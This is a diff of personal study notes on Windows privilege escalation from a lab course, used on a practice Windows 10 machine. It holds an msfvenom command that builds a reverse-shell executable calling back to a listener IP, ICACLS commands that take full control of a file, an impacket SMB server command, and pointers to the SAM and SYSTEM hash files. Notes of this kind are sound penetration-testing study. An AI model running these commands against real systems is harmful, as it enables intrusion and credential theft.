@@ -1,17 +1,21 @@
 Powershell SMB enable
 
-```ICACLS``` Permission checker
-
-Commands
+Checking file and granting permission
 ```cmd
-ICACLS <filename> 
-ICACLS <filename> /grant %username%:F
+ICACLS root.txt 
+ICACLS root.txt /grant %username%:F
 ```
+
+Made this from the Privelege Escalation course from Tib3rius ⁣
+
+Udemy link of his course:https://www.udemy.com/course/windows-privilege-escalation/
+
+This was for a demo windows 10 machine, I used for practise.
 
 > Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
 
 ```zsh
-# python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .
 
 ```
 Generating reverse shell using msfvenom
@@ -19,14 +23,6 @@ Generating reverse shell using msfvenom
 ```zsh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.158.146 LPORT=53 -f exe -o reverse.exe
 ```
-
-Once you get an intial foothold, always look for information about the os
-
-```cmd
-systeminfo 
-```
-Using this we can think about an escalation strategy
-
 
 Permissions to access a certain resource in Windows are
 controlled by the access control list (ACL) for that resource.
@@ -39,7 +35,7 @@ To check your privilege on a system
 ```cmd
 whoami /priv
 ```
-##Services Privilege Escalation
+## Services Privilege Escalation
 
 ```cmd
 .\winPEASany.exe quiet servicesinfo
@@ -224,7 +220,7 @@ The hashes are encrypted with a key which can be found in a file called *System*
 SAM and SYSTEM files are located in the following location. They are locked when windows is running
 
 ***
-     C:\Windows\System32\config d
+     C:\Windows\System32\config 
 ***
 
 Backup of these files. 
@@ -375,7 +371,7 @@ Service accounts can be given special privileges in order for them to run their 
 Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.
 
 Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user.
-This was possible because service accounts usually have the *SeImpersonatePrivilege”* privilege enabled
+This was possible because service accounts usually have the *SeImpersonatePrivilege* privilege enabled
 
 For eg. IIS Runs with the privilegs of a service account , we can get a reverse shell from it
 
